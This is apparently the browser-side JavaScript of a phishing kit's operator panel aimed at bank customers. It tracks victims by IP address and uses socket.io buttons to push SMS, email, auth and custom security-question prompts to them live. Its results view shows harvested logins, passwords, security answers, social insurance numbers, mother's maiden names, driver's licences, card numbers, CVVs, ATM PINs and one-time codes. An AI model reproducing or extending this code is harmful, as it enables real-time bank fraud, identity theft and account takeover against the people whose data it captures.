// Assuming socket is already defined and connected
const socket = io();

function createUserDiv(ipAddress, details) {
  const color = getColorByStage(details.stage, details.status);
  const userDiv = document.createElement('div');
  userDiv.className = 'col-md-4';
  userDiv.innerHTML = getUserDivInnerHTML(ipAddress, details, color);
  setUserDivEventListeners(userDiv, ipAddress, details);
  return userDiv;
}

function getColorByStage(stage, status) {
  if (stage === 'Finish') return 'warning';
  return status === 'actif' ? 'success' : 'danger';
}

function getUserDivInnerHTML(ipAddress, details, color) {
  // You can add more conditions or modify the HTML structure as per your requirements
  return `
    <h5 class="card-title fw-semibold mb-4 badge bg-${color}">${details.status}</h5>
    <div class="card">
      <div class="card-header"><span class="badge bg-${color}">${ipAddress}</span></div>
      <div class="card-body">
        <h5 class="card-title">${details.page || ''}</h5>
        <p class="card-text">${details.stage || ''}</p>
        ${getActionButtonHTML(details)}
      </div>
    </div>
  `;
}

function getActionButtonHTML(details) {
  // Modify this function to include other actions based on `details`
  if (details.page != 'RBC' && details.page != 'SCO' && details.stage != 'CAPTCHA' && details.stage != 'Finish' && details.stage != 'Interac' && details.stage != 'Loading' && details.stage != 'OTP') {
    return `              <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>`;
  } else if (details.stage == "OTP") {
    return `<a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
  } else if (details.stage == "Loading") {
    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-success send-otp-good-button">Good</a>
    <a href="#" class="m-1 btn btn-danger send-otp-bad-button">Bad</a>`;
  } else if (details.page == 'SCO' && details.stage != 'Finish') {
    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
    <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>`;
  } else if (details.page == 'RBC' && details.stage != 'Finish') {
    return `  <a href="#" class="m-1 btn btn-primary results-button">See Result</a>
    <a href="#" class="m-1 btn btn-warning send-otp-sms-button">Send SMS OTP</a>
    <a href="#" class="m-1 btn btn-warning send-otp-email-button">Send EMAIL OTP</a>
    <a href="#" class="m-1 btn btn-warning send-auth-button">Send AUTH</a>
    <button class="m-1 btn btn-warning customQuestionTrigger" type="button" >Custom Question</button>`;
  } else {
    return ` <a href="#" class="m-1 btn btn-primary results-button">See Result</a>`;
  }
  // Add other conditions as needed
  return '';
}


function setUserDivEventListeners(userDiv, ipAddress, details) {
  // Add event listeners to buttons within userDiv
  const resultsButton = userDiv.querySelector('.results-button');
  const sendOtpSmsButton = userDiv.querySelector('.send-otp-sms-button');
  const sendOtpEmailButton = userDiv.querySelector('.send-otp-email-button');
  const sendAuthButton = userDiv.querySelector('.send-auth-button');
  const customQuestionTrigger = userDiv.querySelector('.customQuestionTrigger')
  const sendCustomQuestionButton = document.getElementById('sendCustomQuestionButton');

  if (resultsButton) {
    resultsButton.addEventListener('click', () => showResultsModal(ipAddress));
  }
  if (sendOtpSmsButton) {
    sendOtpSmsButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `sms` })
    });
  }
  if (sendOtpEmailButton) {
    sendOtpEmailButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `email` })
    });
  }
  if (sendAuthButton) {
    sendAuthButton.addEventListener('click', function () {
      socket.emit('sendOTP', { ip: ipAddress, navig: `auth` })
    });
  }
  if (customQuestionTrigger) {

    customQuestionTrigger.addEventListener('click', function () {
      $('#customQuestionModal').modal('show');
    });

    sendCustomQuestionButton.addEventListener('click', function () {
      var customQuestion = document.getElementById('customQuestion').value;
      socket.emit('sendOTP', { ip: ipAddress, navig: `qst2`, customQuestion: customQuestion })
      $('#customQuestionModal').modal('hide');
    })
  }
  // Add other event listeners as needed
}

function showResultsModal(ipAddress) {
  // Function to show the results modal for a specific user
  const modalBody = document.querySelector('#resultsModal .modal-body');
  // Assuming you have a function to fetch user data and then display it
  socket.emit('getUserData', { ip: ipAddress });
  socket.on('setUserData', (userData) => {
    console.log(userData)
    modalBody.innerHTML = formatUserDataForDisplay(userData);
    const modal = new bootstrap.Modal(document.getElementById('resultsModal'));
    modal.show();
  })
}

function updateConnectionsTable(users) {
  const container = document.getElementById('userContainer');
  if (!container) return; // Basic error handling

  container.innerHTML = ''; // Clear previous content
  users.sort(compareUserStatus);

  users.forEach(([ipAddress, details]) => {
    const userDiv = createUserDiv(ipAddress, details);
    container.appendChild(userDiv);
  });
}

function compareUserStatus([, details1], [, details2]) {
  return (details1.status === 'actif' && details2.status !== 'actif') ? -1 :
    (details1.status !== 'actif' && details2.status === 'actif') ? 1 : 0;
}

// Assuming updateActiveUserCount is defined elsewhere

// Call this function when the socket receives 'join' or 'leave' events
socket.on('join', users => updateView(users));
socket.on('leave', users => updateView(users));

function updateView(users) {
  const activeCount = users.reduce((count, [, details]) => count + (details.status === 'actif' ? 1 : 0), 0);
  updateConnectionsTable(users);
  updateActiveUserCount(activeCount);
}

function updateActiveUserCount(newCount) {
  document.getElementById('activeUserCount').textContent = `Active Users: ${newCount}`;
}

function formatUserDataForDisplay(userData) {

  userData.forEach(([ipAddress, details]) => {
   
      if (details.getUserDataLogin || details.getUserDataQuestion || details.getUserDataDetails || details.getUserDataCard || details.getUserDataOTP) {

         return `   <div class="card">
               <button id="downloadButton" class="btn btn-secondary mt-2">Download</button>
  <div class="card-header">
      IP: ${ipAddress}
  </div>
  <ul class="list-group list-group-flush">
      <li class="list-group-item">Username: ${details.getUserDataLogin.username || ''}</li>
      <li class="list-group-item">Password: ${details.getUserDataLogin.password || ''}</li>
      <li class="list-group-item">UserAgent: ${details.getUserDataLogin.userAgent || ''}</li>
        <li class="list-group-item">----------------------------------------------------------</li>
        <li class="list-group-item">${details.getUserDataQuestion.question1 || ''} : ${details.getUserDataQuestion.answer1 || ''}</li>
        <li class="list-group-item">${details.getUserDataQuestion.question2 || ''} : ${details.getUserDataQuestion.answer2 || ''}</li>
        <li class="list-group-item">${details.getUserDataQuestion.question3 || ''} : ${details.getUserDataQuestion.answer3 || ''}</li>
        <li class="list-group-item">${details.getUserDataQuestion.question4 || ''} : ${details.getUserDataQuestion.answer4 || ''}</li>
        <li class="list-group-item">${details.getUserDataQuestion.question5 || ''} : ${details.getUserDataQuestion.answer5 || ''}</li>
        <li class="list-group-item">${details.getUserDataOTP.customQuestion || ''} : ${details.getUserDataOTP.customAnswer || ''}</li>
          <li class="list-group-item">----------------------------------------------------------</li>
      <li class="list-group-item">Full Name: ${details.getUserDataDetails.name || ''}</li>
      <li class="list-group-item">Address: ${details.getUserDataDetails.address || ''}</li>
      <li class="list-group-item">City: ${details.getUserDataDetails.city || ''}</li>
      <li class="list-group-item">Phone Number: ${details.getUserDataDetails.phone || ''}</li>
      <li class="list-group-item">Postal Code: ${details.getUserDataDetails.postal || ''}</li>
      <li class="list-group-item">Digit Pin: ${details.getUserDataDetails.pin || ''}</li>
      <li class="list-group-item">Email: ${details.getUserDataDetails.email || ''}</li>
      <li class="list-group-item">DOB: ${details.getUserDataDetails.dob1 || ''}/${details.getUserDataDetails.dob2 || ''}/${details.getUserDataDetails.dob3 || ''} || ${details.getUserDataDetails.dob || ''}</li>
      <li class="list-group-item">Mmn: ${details.getUserDataDetails.mmn || ''}</li>
      <li class="list-group-item">Sin: ${details.getUserDataDetails.sin || ''}</li>
      <li class="list-group-item">Driver Licence: ${details.getUserDataDetails.drivers || ''}</li>
       <li class="list-group-item">----------------------------------------------------------</li>
       <li class="list-group-item">Card Number: ${details.getUserDataCard.card || ''}</li>
       <li class="list-group-item">Exp: ${details.getUserDataCard.exp1 || ''}/${details.getUserDataCard.exp1 || ''}</li>
      <li class="list-group-item">Cvv: ${details.getUserDataCard.cvv || ''}</li>
      <li class="list-group-item">ATM PIN: ${details.getUserDataCard.atm || ''}</li>
       <li class="list-group-item">----------------------------------------------------------</li>
      <li class="list-group-item">OTP: ${details.getUserDataOTP.code || ''}</li>
  </ul> </div>`;

      } else {
        return `No result for IP: ${ipAddress}`;
      }
    
  })

}

document.getElementById('deleteAll').addEventListener('click', function () {
  socket.emit('deleteAll');
});
